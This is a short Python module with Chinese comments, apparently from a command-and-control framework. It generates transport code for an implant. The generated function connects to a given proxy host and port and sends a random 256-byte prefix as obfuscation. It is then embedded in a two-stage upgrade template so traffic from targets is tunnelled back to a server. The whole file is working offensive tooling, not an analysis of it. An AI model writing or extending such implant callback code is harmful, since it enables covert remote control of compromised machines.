"""
@module: transport_tcp
@desc: 生成 TCP 传输实现代码（明文直连, 无 TLS 封装; 解包即原始 TCP 流量,
端口转发语义——target 连接直接经 agent_tcp 隧道转发到 server）
@params: host port key_hex
"""
MODULE = {
    "desc": "生成 TCP 传输实现代码（明文直连）",
    "params": [
        ("host", "必填，目标 proxy 地址"),
        ("port", "必填，目标 proxy 端口"),
        ("key_hex", "必填，proxy_key"),
    ],
}


def run(host, port, key_hex):
    """生成 _nT() 实现: 纯 TCP 连接 + 256B 混淆前缀。

    生成的代码由 uplevel 命令嵌入两阶段升级模板（transport_base）。
    _nT 返回已连通的 socket; 帧收发沿用 implant 的 p()/q()。
    """
    host = str(host)
    port = int(port)

    code = f'''\
import socket as _sa, os as _os
def _nT():
    s = _sa.socket()
    s.settimeout(30)
    s.connect(({host!r}, {port}))
    s.sendall(_os.urandom(256))  # 混淆: 首包随机前缀(proxy a2s 吞掉)
    return s
'''
    return code
